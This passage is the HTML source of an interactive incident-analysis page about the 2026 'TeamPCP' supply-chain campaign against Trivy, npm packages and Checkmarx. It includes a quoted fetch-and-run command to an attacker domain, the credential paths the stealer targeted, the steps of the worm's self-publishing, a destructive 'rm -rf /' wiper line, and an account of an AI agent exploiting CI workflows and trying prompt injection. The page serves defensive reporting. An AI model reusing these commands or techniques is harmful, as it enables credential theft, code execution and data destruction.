@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ANATOMY OF A CASCADE — The TeamPCP Attack</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--bg:#06080F;--surface:#0C1018;--card:#111827;--border:#1a2235;
+--red:#ff3b3b;--red-glow:rgba(255,59,59,0.3);--red-dim:#330a0a;
+--teal:#00d4a1;--teal-glow:rgba(0,212,161,0.2);--teal-dim:#002a20;
+--amber:#ffb020;--amber-glow:rgba(255,176,32,0.3);
+--blue:#3b8bff;--purple:#8b5cf6;
+--text:#e8e6e0;--text-sec:#8a8880;--text-dim:#4a4940;
+--font:'Outfit',sans-serif;--mono:'JetBrains Mono',monospace;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--font);overflow-x:hidden;-webkit-font-smoothing:antialiased}
+
+.hero{height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;overflow:hidden}
+.hero-bg{position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 40%,rgba(255,59,59,0.06),transparent 70%),radial-gradient(ellipse 60% 40% at 30% 70%,rgba(139,92,246,0.04),transparent)}
+.scan-line{position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--red),transparent);animation:scanDown 4s ease-in-out infinite;opacity:0.3}
+@keyframes scanDown{0%{top:0}100%{top:100%}}
+
+.lobster-container{position:relative;width:280px;height:280px;margin-bottom:30px}
+.lobster-glow{position:absolute;inset:-40px;border-radius:50%;background:radial-gradient(circle,rgba(255,59,59,0.15),transparent 70%);animation:pulse 3s ease-in-out infinite}
+@keyframes pulse{0%,100%{transform:scale(1);opacity:0.6}50%{transform:scale(1.1);opacity:1}}
+.lobster-svg{position:absolute;inset:0;filter:drop-shadow(0 0 30px rgba(255,59,59,0.3))}
+
+.hero-title{font-size:clamp(36px,5vw,64px);font-weight:900;text-align:center;letter-spacing:-2px;line-height:1.1;text-transform:uppercase;background:linear-gradient(135deg,#ff3b3b,#ff6b3b,#ffb020);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-sub{font-size:clamp(14px,1.8vw,20px);color:var(--text-sec);text-align:center;margin-top:12px;font-weight:300;max-width:700px;line-height:1.5}
+.hero-meta{font-family:var(--mono);font-size:11px;color:var(--text-dim);margin-top:20px;letter-spacing:1px;text-align:center}
+.scroll-hint{position:absolute;bottom:30px;font-size:11px;color:var(--text-dim);letter-spacing:2px;animation:bob 2s ease-in-out infinite}
+@keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(8px)}}
+
+.section{padding:80px 5vw;position:relative}
+.section-label{font-size:11px;letter-spacing:3px;text-transform:uppercase;font-weight:600;margin-bottom:8px}
+.section-label.red{color:var(--red)}
+.section-label.teal{color:var(--teal)}
+.section-label.amber{color:var(--amber)}
+.section-title{font-size:clamp(28px,3vw,42px);font-weight:800;letter-spacing:-1px;margin-bottom:40px;line-height:1.2}
+
+.timeline{position:relative;max-width:1200px;margin:0 auto}
+.timeline-line{position:absolute;left:50%;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,transparent,var(--red) 5%,var(--red) 95%,transparent);transform:translateX(-50%)}
+.timeline-line::after{content:'';position:absolute;left:50%;top:0;bottom:0;width:6px;transform:translateX(-50%);background:linear-gradient(to bottom,transparent,var(--red-glow) 5%,var(--red-glow) 95%,transparent);filter:blur(4px)}
+
+.tl-node{display:flex;gap:40px;margin-bottom:60px;position:relative;align-items:flex-start;opacity:0;transform:translateY(30px);transition:opacity 0.6s,transform 0.6s}
+.tl-node.visible{opacity:1;transform:translateY(0)}
+.tl-node:nth-child(even){flex-direction:row-reverse}
+.tl-node:nth-child(even) .tl-card{text-align:left}
+
+.tl-dot{position:absolute;left:50%;top:24px;transform:translate(-50%,-50%);width:18px;height:18px;border-radius:50%;background:var(--red);box-shadow:0 0 20px var(--red-glow),0 0 40px var(--red-glow);z-index:2}
+.tl-dot .num{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:#fff}
+
+.tl-card{flex:1;max-width:calc(50% - 40px);background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;cursor:pointer;transition:all 0.3s}
+.tl-card:hover{border-color:rgba(255,59,59,0.3);box-shadow:0 8px 40px rgba(0,0,0,0.4),0 0 30px var(--red-glow);transform:translateY(-2px)}
+
+.tl-card-header{padding:16px 20px;border-bottom:1px solid var(--border);position:relative;overflow:hidden}
+.tl-card-header::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--red),var(--amber))}
+.tl-card-title{font-size:16px;font-weight:700;letter-spacing:-0.5px}
+.tl-card-date{font-size:11px;color:var(--text-dim);font-family:var(--mono);margin-top:4px}
+.tl-card-actor{font-size:11px;color:var(--amber);font-weight:500;margin-top:2px}
+
+.tl-card-body{padding:16px 20px}
+.tl-card-body .label{font-size:8px;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:4px}
+.tl-card-body .label.dim{color:var(--text-dim)}
+.tl-card-body .label.blue{color:var(--blue)}
+.tl-card-body .label.red{color:var(--red)}
+.tl-card-body .val{font-size:12px;line-height:1.6;color:var(--text-sec);margin-bottom:12px}
+.tl-card-body .val.blue{color:rgba(100,170,255,0.85)}
+.tl-card-body .val.red{color:rgba(255,140,140,0.85)}
+.tl-card-body .sep{height:1px;background:var(--border);margin:12px 0}
+.tl-card-body .vector-tag{display:inline-block;padding:4px 10px;background:rgba(255,59,59,0.08);border:1px solid rgba(255,59,59,0.15);border-radius:20px;font-size:10px;color:var(--red);font-weight:500;margin-bottom:12px}
+
+.tl-detail{display:none;padding:16px 20px;border-top:1px solid var(--border);background:rgba(6,8,15,0.6)}
+.tl-card.open .tl-detail{display:block}
+.tl-detail .dt{font-size:9px;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;margin-top:14px}
+.tl-detail .dt:first-child{margin-top:0}
+.tl-detail .dt.red{color:var(--red)}.tl-detail .dt.blue{color:var(--blue)}.tl-detail .dt.amber{color:var(--amber)}
+.tl-detail .dd{font-size:11px;line-height:1.7;color:var(--text-sec)}
+.tl-detail .dd strong{color:var(--text);font-weight:500}
+.tl-expand{font-size:9px;color:var(--text-dim);text-align:center;padding:8px;letter-spacing:1px;border-top:1px solid var(--border);transition:color 0.2s}
+.tl-card:hover .tl-expand{color:var(--red)}
+.tl-card.open .tl-expand{color:var(--red)}
+
+.mit-strip{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.mit-card{background:linear-gradient(135deg,rgba(0,212,161,0.06),rgba(0,212,161,0.02));border:1px solid rgba(0,212,161,0.15);border-radius:10px;padding:14px;cursor:pointer;transition:all 0.3s;position:relative;overflow:hidden}
+.mit-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--teal);opacity:0.4}
+.mit-card:hover{border-color:rgba(0,212,161,0.4);box-shadow:0 4px 20px rgba(0,212,161,0.1);transform:translateY(-2px)}
+.mit-card .pct{font-size:28px;font-weight:800;color:var(--teal);font-family:var(--mono);line-height:1}
+.mit-card .pct-label{font-size:8px;color:var(--teal);opacity:0.6;letter-spacing:1px;text-transform:uppercase;margin-top:2px}
+.mit-card .mit-title{font-size:11px;font-weight:600;color:var(--teal);margin-top:10px;line-height:1.3}
+.mit-card .mit-text{font-size:9px;line-height:1.5;color:rgba(93,202,165,0.7);margin-top:6px}
+.mit-card .mit-full{display:none;margin-top:10px;padding-top:10px;border-top:1px solid rgba(0,212,161,0.15);font-size:10px;line-height:1.6;color:rgba(93,202,165,0.8)}
+.mit-card.open .mit-full{display:block}
+
+.awareness-section{position:relative;overflow:hidden}
+.awareness-section::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 50% 50% at 85% 50%,rgba(255,176,32,0.06),transparent)}
+.awareness-chart{max-width:1200px;margin:0 auto;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px;position:relative;overflow:hidden}
+.awareness-chart::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--amber),transparent);opacity:0.3}
+.chart-legend{display:flex;gap:24px;margin-bottom:16px;font-size:10px;color:var(--text-dim);flex-wrap:wrap}
+.chart-legend .sw{display:inline-block;width:20px;height:3px;border-radius:2px;vertical-align:middle;margin-right:6px}
+
+.big-quote{max-width:900px;margin:80px auto;text-align:center;position:relative;padding:40px}
+.big-quote::before{content:'\201C';position:absolute;top:-20px;left:50%;transform:translateX(-50%);font-size:120px;color:var(--red);opacity:0.1;font-family:Georgia,serif;line-height:1}
+.big-quote .q{font-size:clamp(18px,2.5vw,28px);font-weight:300;line-height:1.6;font-style:italic;color:var(--text-sec)}
+.big-quote .q em{color:var(--red);font-style:normal;font-weight:500}
+.big-quote .attr{font-size:12px;color:var(--text-dim);margin-top:16px;font-family:var(--mono)}
+
+.stats-grid{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(5,1fr);gap:12px}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:20px;text-align:center;position:relative;overflow:hidden}
+.stat-card::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--red);opacity:0.4}
+.stat-card .sv{font-size:32px;font-weight:800;color:var(--red);font-family:var(--mono);letter-spacing:-1px}
+.stat-card .sl{font-size:10px;color:var(--text-sec);margin-top:4px}
+
+.final-callout{max-width:1000px;margin:0 auto;background:linear-gradient(135deg,rgba(255,59,59,0.04),rgba(255,176,32,0.04));border:1px solid rgba(255,59,59,0.15);border-left:3px solid var(--red);border-radius:12px;padding:30px;position:relative}
+.final-callout p{font-size:14px;line-height:1.7;color:var(--text-sec);margin-bottom:10px}
+.final-callout p:last-child{margin-bottom:0}
+.final-callout .hl{color:var(--text);font-weight:600}
+.final-callout .teal-hl{color:var(--teal);font-weight:600}
+
+.footer{text-align:center;padding:40px 20px;font-size:9px;color:var(--text-dim);font-family:var(--mono);letter-spacing:1px}
+
+@media(max-width:900px){
+.tl-node{flex-direction:column!important;align-items:center}
+.tl-card{max-width:100%!important}
+.tl-dot{position:relative;left:auto;top:auto;transform:none;margin-bottom:16px}
+.timeline-line{display:none}
+.mit-strip{grid-template-columns:1fr 1fr}
+.stats-grid{grid-template-columns:repeat(3,1fr)}
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+<div class="hero-bg"></div>
+<div class="scan-line"></div>
+<div class="lobster-container">
+<div class="lobster-glow"></div>
+<svg class="lobster-svg" viewBox="0 0 280 280" fill="none" xmlns="http://www.w3.org/2000/svg">
+<g transform="translate(140,150)">
+<!-- Body -->
+<ellipse cx="0" cy="0" rx="52" ry="38" fill="#cc2020" opacity="0.9"/>
+<ellipse cx="0" cy="0" rx="52" ry="38" fill="none" stroke="#ff4040" stroke-width="1" opacity="0.6"/>
+<!-- Shell segments -->
+<path d="M-40,-10 Q0,-25 40,-10" fill="none" stroke="#ff6060" stroke-width="1" opacity="0.4"/>
+<path d="M-45,0 Q0,-15 45,0" fill="none" stroke="#ff6060" stroke-width="1" opacity="0.3"/>
+<path d="M-45,10 Q0,-5 45,10" fill="none" stroke="#ff6060" stroke-width="1" opacity="0.2"/>
+<!-- Head -->
+<ellipse cx="0" cy="-35" rx="24" ry="18" fill="#cc2020" opacity="0.95"/>
+<ellipse cx="0" cy="-35" rx="24" ry="18" fill="none" stroke="#ff4040" stroke-width="1" opacity="0.5"/>
+<!-- Eyes -->
+<line x1="-10" y1="-50" x2="-14" y2="-68" stroke="#ff4040" stroke-width="2.5" stroke-linecap="round"/>
+<circle cx="-14" cy="-72" r="5" fill="#111" stroke="#ff4040" stroke-width="1.5"/>
+<circle cx="-13" cy="-73" r="2" fill="#ff3b3b"/>
+<line x1="10" y1="-50" x2="14" y2="-68" stroke="#ff4040" stroke-width="2.5" stroke-linecap="round"/>
+<circle cx="14" cy="-72" r="5" fill="#111" stroke="#ff4040" stroke-width="1.5"/>
+<circle cx="15" cy="-73" r="2" fill="#ff3b3b"/>
+<!-- Antennae -->
+<path d="M-8,-50 Q-30,-90 -50,-85" fill="none" stroke="#ff4040" stroke-width="1.5" stroke-linecap="round" opacity="0.7"/>
+<path d="M8,-50 Q30,-90 50,-85" fill="none" stroke="#ff4040" stroke-width="1.5" stroke-linecap="round" opacity="0.7"/>
+<!-- Left claw arm -->
+<path d="M-48,-8 L-75,-30 L-90,-25" fill="none" stroke="#cc2020" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
+<path d="M-48,-8 L-75,-30 L-90,-25" fill="none" stroke="#ff4040" stroke-width="1" opacity="0.5"/>
+<!-- Left claw -->
+<path d="M-90,-25 Q-105,-40 -95,-50 Q-88,-45 -90,-25" fill="#cc2020" stroke="#ff4040" stroke-width="1"/>
+<path d="M-90,-25 Q-100,-15 -108,-22 Q-98,-28 -90,-25" fill="#cc2020" stroke="#ff4040" stroke-width="1"/>
+<!-- Right claw arm -->
+<path d="M48,-8 L75,-30 L90,-25" fill="none" stroke="#cc2020" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
+<path d="M48,-8 L75,-30 L90,-25" fill="none" stroke="#ff4040" stroke-width="1" opacity="0.5"/>
+<!-- Right claw -->
+<path d="M90,-25 Q105,-40 95,-50 Q88,-45 90,-25" fill="#cc2020" stroke="#ff4040" stroke-width="1"/>
+<path d="M90,-25 Q100,-15 108,-22 Q98,-28 90,-25" fill="#cc2020" stroke="#ff4040" stroke-width="1"/>
+<!-- Right claw holding terminal -->
+<rect x="82" y="-55" width="32" height="22" rx="3" fill="#111" stroke="#00d4a1" stroke-width="1" opacity="0.8"/>
+<text x="88" y="-41" font-size="6" fill="#00d4a1" font-family="monospace" opacity="0.9">$_</text>
+<rect x="92" y="-49" width="16" height="2" rx="1" fill="#00d4a1" opacity="0.4"/>
+<rect x="92" y="-45" width="12" height="2" rx="1" fill="#ff3b3b" opacity="0.5"/>
+<!-- Tail -->
+<path d="M0,36 L0,55 L-12,68 L0,62 L12,68 L0,55" fill="#cc2020" stroke="#ff4040" stroke-width="1" opacity="0.8"/>
+<!-- Legs left -->
+<line x1="-38" y1="15" x2="-58" y2="35" stroke="#cc2020" stroke-width="3" stroke-linecap="round"/>
+<line x1="-42" y1="22" x2="-62" y2="42" stroke="#cc2020" stroke-width="3" stroke-linecap="round"/>
+<line x1="-40" y1="28" x2="-55" y2="50" stroke="#cc2020" stroke-width="3" stroke-linecap="round"/>
+<!-- Legs right -->
+<line x1="38" y1="15" x2="58" y2="35" stroke="#cc2020" stroke-width="3" stroke-linecap="round"/>
+<line x1="42" y1="22" x2="62" y2="42" stroke="#cc2020" stroke-width="3" stroke-linecap="round"/>
+<line x1="40" y1="28" x2="55" y2="50" stroke="#cc2020" stroke-width="3" stroke-linecap="round"/>
+<!-- Glitch text on body -->
+<text x="-18" y="5" font-size="7" fill="#ff3b3b" font-family="monospace" opacity="0.6">TeamPCP</text>
+</g>
+</svg>
+</div>
+<h1 class="hero-title">Anatomy of<br>a Cascade</h1>
+<p class="hero-sub">An OpenClaw AI agent scanned 47,391 repositories, found one misconfiguration, and triggered the most consequential supply chain attack of 2026.</p>
+<div class="hero-meta">FEB 20 – MAR 24, 2026 &nbsp;&bull;&nbsp; 5 ECOSYSTEMS &nbsp;&bull;&nbsp; 1,000+ COMPROMISED &nbsp;&bull;&nbsp; 33 DAYS</div>
+<div class="scroll-hint">&darr; SCROLL TO BEGIN &darr;</div>
+</div>
+
+<section class="section">
+<div class="section-label red">THE ATTACK CHAIN</div>
+<h2 class="section-title">Seven compromises.<br>One unbroken chain.</h2>
+
+<div class="timeline">
+<div class="timeline-line"></div>
+<div id="timeline-nodes"></div>
+</div>
+</section>
+
+<div class="big-quote">
+<div class="q">"These companies were built to protect your supply chains yet they <em>can't even protect their own</em>. The state of modern security research is a joke."</div>
+<div class="attr">— TeamPCP, Telegram channel, March 24, 2026</div>
+</div>
+
+<section class="section">
+<div class="section-label teal">WHAT WOULD HAVE STOPPED THIS</div>
+<h2 class="section-title">Known practices.<br>Not implemented.</h2>
+<div class="mit-strip" id="mit-strip"></div>
+</section>
+
+<section class="section awareness-section">
+<div class="section-label amber">DEVELOPER AWARENESS</div>
+<h2 class="section-title">33 days of warnings.<br>One tweet that mattered.</h2>
+<div class="awareness-chart">
+<div class="chart-legend">
+<span><span class="sw" style="background:var(--text-dim)"></span>Developer awareness</span>
+<span><span class="sw" style="background:var(--red)"></span>Compromised environments</span>
+<span><span class="sw" style="background:var(--amber);height:4px"></span>Karpathy spike</span>
+</div>
+<svg viewBox="0 0 1150 200" style="width:100%;display:block" id="awareChart"></svg>
+</div>
+</section>
+
+<section class="section">
+<div class="stats-grid">
+<div class="stat-card"><div class="sv">5</div><div class="sl">ecosystems hit</div></div>
+<div class="stat-card"><div class="sv">1,000+</div><div class="sl">environments compromised</div></div>
+<div class="stat-card"><div class="sv">95M</div><div class="sl">monthly downloads (LiteLLM)</div></div>
+<div class="stat-card"><div class="sv">33d</div><div class="sl">7 cascading compromises</div></div>
+<div class="stat-card"><div class="sv">70–100%</div><div class="sl">preventable</div></div>
+</div>
+</section>
+
+<section class="section">
+<div class="final-callout">
+<p>33 days of security advisories from Wiz, Socket, StepSecurity, Aikido, Sysdig, CrowdStrike, and Microsoft. A CVE was assigned with a 9.4 CVSS score. Mandiant confirmed 1,000+ compromised environments at RSAC 2026.</p>
+<p class="hl">None of it registered with the broader AI developer community until one AI thought leader reframed it as an AI problem.</p>
+<p class="teal-hl">The practices that would have prevented 70–100% of this attack chain have existed for years. SHA pinning since 2020. OIDC trusted publishing since 2023. Credential rotation since the beginning of time. The AI hype made the industry forget everything it already knew.</p>
+</div>
+</section>
+
+<div class="footer">DATA: WIZ &bull; SOCKET &bull; AIKIDO &bull; SYSDIG &bull; ENDOR LABS &bull; STEPSECURITY &bull; SNYK &bull; BLEEPINGCOMPUTER &bull; MANDIANT &bull; MICROSOFT &nbsp;|&nbsp; MARCH 24, 2026</div>
+
+<script>
+const N=[
+{n:"1",t:"PWN REQUEST",d:"Feb 20–28, 2026",a:"hackerbot-claw (OpenClaw agent)",v:"Misconfigured pull_request_target workflow",
+desc:"OpenClaw AI agent scans 47,391 repos using 9 vulnerability classes and 47 sub-patterns. Identifies and exploits the misconfiguration in Trivy\u2019s CI. Achieves RCE and exfiltrates PAT within 19 minutes.",
+u:"7 repos targeted (Microsoft, DataDog, CNCF, Trivy 32K\u2605, awesome-go 140K\u2605). RCE in 4/7.",
+s:"aqua-bot PAT (org-wide repo scope). All 178 releases deleted. Malicious VS Code extension published.",
+ft:"The hackerbot-claw account was created February 20, 2026 and described itself as an \u201cautonomous security research agent powered by Claude Opus 4.5.\u201d It maintained a vulnerability pattern index with 9 classes and 47 sub-patterns, targeting repos with pull_request_target triggers.\n\nTrivy had a workflow (apidiff.yaml) using pull_request_target \u2014 a well-documented footgun where the workflow runs with base repo secrets but executes fork code. The bot injected a Go init() function, the workflow ran: curl -sSfL hackmoltrepeat.com/molt | bash. The payload dumped /proc/<pid>/mem to extract the aqua-bot PAT.\n\nWithin 19 minutes, the PAT was active. The attacker deleted all 178 releases, stripped 32K stars, and pushed a malicious VS Code extension to OpenVSX. Seven repos were targeted including Microsoft, DataDog, and a CNCF project.\n\nIn ambient-code/platform, the bot attempted to compromise a Claude-based CI pipeline via prompt injection in CLAUDE.md. Claude identified the attack and refused \u2014 the first documented AI-vs-AI defense in CI/CD.",
+fu:"Primary target: aquasecurity/trivy \u2014 32,000+ GitHub stars, 100M+ Docker Hub pulls, integrated into thousands of CI/CD pipelines globally.\n\nOther targets: Microsoft/ai-discovery-agent, DataDog/datadog-iac-scanner, avelino/awesome-go (140K stars), project-akri/akri (CNCF), RustPython (20K stars). Combined stars exceeding 200,000.\n\nRepello AI: \u201cThe operator, identified as TeamPCP from metadata analysis, appears to be a single-person operation running a structured nine-phase attack campaign.\u201d",
+fs:"The aqua-bot PAT had repo scope across the entire aquasecurity org. With it, the attacker deleted all 178 releases, renamed the repo, stripped 32K+ stars, published a malicious VS Code extension with a 2,000-word AI agent manipulation prompt, compromised aqua-bot to push malicious workflows to tfsec/traceeshark/trivy-action, and stole GPG keys plus Docker Hub/Twitter/Slack credentials. All exfiltrated to hackmoltrepeat.com."},
+{n:"2",t:"FAILED ROTATION",d:"March 1, 2026",a:"Aqua Security (IR failure)",v:"Incomplete credential rotation after known breach",
+desc:"Aqua discloses Feb breach and rotates credentials. Rotation is incomplete. The Argon-DevOps-Mgt service account \u2014 bridging two GitHub orgs with a long-lived PAT \u2014 retains valid access.",
+u:"No new direct victims. But residual access enables every subsequent compromise.",
+s:"Nothing new stolen. The attacker retains the master key for everything that follows.",
+ft:"Aqua disclosed the incident (GitHub Discussion #10265), revoked the compromised aqua-bot PAT, removed the malicious VS Code extension, released Trivy v0.69.2, and removed the vulnerable workflow.\n\nHowever, the Argon-DevOps-Mgt service account was not included in the rotation. This single bot account bridged the \u201caquasecurity\u201d and \u201caquasec-com\u201d GitHub organizations with a long-lived PAT.\n\nOpenSourceMalware: \u201cA credential harvested during the Trivy GitHub Actions compromise was weaponized to deface an entire internal GitHub organization. The Argon-DevOps-Mgt service account \u2014 a single bot account bridging two orgs with a long-lived PAT \u2014 was the weak link.\u201d\n\nWiz confirmed: \u201cThe attack was conducted with access retained following incomplete containment of the earlier incident.\u201d",
+fu:"No systems directly compromised. But the residual access enabled:\n\u2022 Node 3: Force-pushing 76/77 trivy-action tags\n\u2022 Node 5: Defacing all 44 internal aquasec-com repositories\n\u2022 Node 5: Publishing malicious Docker images\n\nEvery credential stolen in Nodes 3\u20137 traces back to this single unrotated service account.",
+fs:"No new credentials stolen. The significance is entirely in what was preserved: the Argon-DevOps-Mgt PAT that bridged two GitHub organizations. This single credential became the master key for the entire subsequent campaign."},
+{n:"3",t:"TRIVY WEAPONIZED",d:"March 19, 2026",a:"TeamPCP",v:"Mutable GitHub Actions version tags (force-push)",
+desc:"Force-pushes 76/77 trivy-action tags and all 7 setup-trivy tags to malicious commits. Spoofs commit metadata. Publishes backdoored v0.69.4 to GitHub Releases, Docker Hub, GHCR, ECR.",
+u:"10,000+ workflows affected. 45 repos confirmed compromised. CVE-2026-33634 (CVSS 9.4). Trivy: 32K\u2605, 100M+ Docker pulls.",
+s:"CI/CD memory dumps. SSH keys. AWS/GCP/Azure creds. K8s tokens. npm tokens. Docker tokens. Crypto wallets. 50+ paths swept.",
+ft:"At 17:43:37 UTC, TeamPCP force-pushed malicious commits. Three simultaneous attacks:\n\n1. Binary poisoning: Commit 1885610c swapped actions/checkout to imposter commit 70379aad fetching malware from scan.aquasecurtiy[.]org (typosquat). Added --skip=validate to bypass goreleaser. Tagged v0.69.4, triggering releases to GitHub, Docker Hub, GHCR, ECR.\n\n2. trivy-action: 75/76 tags force-pushed. Each forged commit cloned original metadata (author, timestamp, message). Only clean tag: 0.35.0 (immutable release).\n\n3. setup-trivy: All 7 tags force-pushed.\n\nThree-stage \u201cTeamPCP Cloud stealer\u201d:\n\u2022 Collection: Scraped Runner.Worker memory via /proc/<pid>/mem, swept 50+ file paths\n\u2022 Encryption: AES-256-CBC + RSA-4096\n\u2022 Exfiltration: POST to scan.aquasecurtiy[.]org. Fallback: tpcp-docs repo on victim\u2019s account\n\nExposure: binary ~3hrs, trivy-action ~12hrs, setup-trivy ~4hrs.",
+fu:"Over 10,000 GitHub workflows reference trivy-action. StepSecurity confirmed 45 prominent repos (of 767 analyzed with 100+ stars) ran compromised versions. Total affected workflows including private repos is significantly higher.\n\nTrivy: 32K GitHub stars, 100M+ Docker Hub pulls. CVE-2026-33634 (CVSS 9.4).\n\nCrowdStrike, Microsoft, Wiz, Socket, StepSecurity, and Sysdig all published technical analyses.",
+fs:"The stealer targeted:\n\u2022 Runner.Worker process memory (masked secrets)\n\u2022 SSH keys (~/.ssh/)\n\u2022 AWS/GCP/Azure/K8s/Docker credentials\n\u2022 npm tokens (~/.npmrc, NPM_TOKEN)\n\u2022 Cryptocurrency wallets (Solana validator keypairs emphasized)\n\u2022 .env files, shell history, SSL private keys\n\nThe stolen npm tokens became the launch pad for CanisterWorm less than 24 hours later."},
+{n:"4",t:"CANISTERWORM",d:"March 20, 2026",a:"TeamPCP",v:"Stolen npm tokens + self-propagating worm",
+desc:"AI-generated (vibe-coded) worm. deploy.js iterates every package each stolen token can publish to, bumps patch version, preserves README, publishes. Persistence via systemd masquerading as PostgreSQL.",
+u:"66+ npm packages, 141+ malicious artifacts. @EmilGroup, @opengov, @teale.io, @airtm, @pypestream. Every victim becomes a propagation vector.",
+s:"Additional npm tokens (self-replicating). Persistent backdoor polling ICP blockchain canister C2 (takedown-resistant).",
+ft:"Detected at 20:45 UTC by Aikido Security. The worm (deploy.js):\n\u2022 Reads NPM_TOKENS (comma-separated) or NPM_TOKEN\n\u2022 Resolves identity via npm /-/whoami\n\u2022 Enumerates all publishable packages via search API\n\u2022 Bumps patch version automatically\n\u2022 Preserves original README\n\u2022 Publishes with --tag latest\n\nAssessed as \u201cvibe-coded\u201d \u2014 AI-generated, no obfuscation.\n\nPayload (postinstall hook):\n\u2022 Decodes base64 Python script to ~/.local/share/pgmon/service.py\n\u2022 Creates systemd user service (pgmon.service, Restart=always, 5s delay)\n\u2022 Backdoor polls ICP canister (tdtqy-oyaaa-aaaae-af2dq-cai) as dead-drop C2\n\u2022 First documented abuse of ICP canister for C2\n\u2022 At analysis time, the URL returned a Rick Roll (kill switch)",
+fu:"Socket tracked 135+ malicious artifacts spanning 64+ unique packages by March 21. Later expanded to 141+ artifacts across 66+ packages.\n\nAffected scopes: @EmilGroup (28 packages), @opengov (16+), @teale.io, @airtm, @pypestream.\n\nAn upgraded variant in @teale.io/eslint-config added findNpmTokens() \u2014 harvesting tokens from .npmrc, env vars, and npm config during postinstall. Every compromised dev/CI pipeline becomes a propagation vector.\n\nSocket: \u201cThis is where the attack goes from \u2018compromised account publishes malware\u2019 to \u2018malware compromises more accounts and publishes itself.\u2019\u201d",
+fs:"Primary: npm authentication tokens from .npmrc files, environment variables, and npm config. System credentials via the PostgreSQL-masquerading backdoor.\n\nThe persistent backdoor polls the ICP canister every 50 minutes. The canister controller can swap the URL at any time, pushing new binaries without touching the implant. Artifacts named to blend in: pgmon, pglog, .pg_state.\n\nThe ICP canister was eventually marked \u201cUnavailable Due to Policy Violation\u201d at 21:31 UTC, but this required extended coordination and is not a repeatable enforcement mechanism."},
+{n:"5",t:"WIPER + DEFACEMENT",d:"March 22, 2026",a:"TeamPCP",v:"Mutable Docker tags + unrotated PAT + K8s DaemonSets",
+desc:"Three concurrent attacks: (a) Malicious Docker images 0.69.5/0.69.6. (b) 44 repos defaced in 2-min burst. (c) kamikaze.sh Iran-targeted K8s wiper.",
+u:"Docker Hub users. Aqua internal org exposed: Tracee, K8s operators, CI/CD configs. Iranian K8s clusters: total destruction. Others: persistent backdoor.",
+s:"Source code exposed. Docker supply chain poisoned. Iranian hosts: rm -rf /. K8s clusters: every node wiped via kamikaze container.",
+ft:"(a) Docker Hub (~16:00 UTC): Images 0.69.5 and 0.69.6 pushed without GitHub releases. \u2018latest\u2019 pointed to compromised 0.69.6.\n\n(b) GitHub defacement (20:31\u201320:32 UTC): All 44 repos in \u201caquasec-com\u201d org modified in a scripted 2-minute burst. Renamed with \u201ctpcp-docs-\u201d prefix, descriptions set to \u201cTeamPCP Owns Aqua Security,\u201d made public. Used Argon-DevOps-Mgt account.\n\n(c) kamikaze.sh: ICP canister C2 serving iteratively developed payload. Checks timezone (Asia/Tehran) and locale (fa_IR):\n\u2022 Iranian K8s: DaemonSet \u201chost-provisioner-iran\u201d, container \u201ckamikaze\u201d \u2014 mounts host root, wipes all directories, force-reboots. Tolerations schedule on every node.\n\u2022 Non-Iranian K8s: \u201chost-provisioner-std\u201d with persistent backdoor\n\u2022 Iranian non-K8s: rm -rf / --no-preserve-root\n\u2022 Other: Exits\n\nThird variant added self-spreading via SSH keys and Docker API scanning (port 2375).",
+fu:"Docker Hub: Anyone pulling \u2018latest\u2019 Trivy tag got compromised 0.69.6.\n\naquasec-com org contained:\n\u2022 Tracee source code\n\u2022 Internal Trivy forks\n\u2022 CI/CD pipeline configurations\n\u2022 Kubernetes operators\n\u2022 Team knowledge bases\n\nAll briefly exposed publicly. Iranian wiper: fully functional, actively deployed. No public confirmation of successful wipes, but capability was operational.",
+fs:"Docker Hub: Supply chain poisoned. GitHub: Proprietary source code, CI/CD configs, knowledge bases exposed. Wiper: Total destruction on Iranian systems; persistent backdoor on all others. Lateral movement via SSH and Docker API exploitation for subnet-wide propagation.\n\nPayload versions rotated through multiple Cloudflare tunnel domains. Service names shifted: pgmon \u2192 internal-monitor \u2192 pgmonitor."},
+{n:"6",t:"CHECKMARX HIT",d:"March 23, 2026",a:"TeamPCP",v:"Cross-vendor credential reuse from Trivy pipelines",
+desc:"Compromises cx-plugins-releases account. All 35 KICS tags force-pushed. ast-github-action v2.3.28 poisoned. Two OpenVSX extensions backdoored. New C2: checkmarx[.]zone.",
+u:"CI/CD pipelines running KICS during 4-hour window (12:58\u201316:50 UTC). OpenVSX extension users. KICS widely used in enterprise.",
+s:"Identical stealer + K8s persistence. Vendor-specific typosquat defeats prior blocklists.",
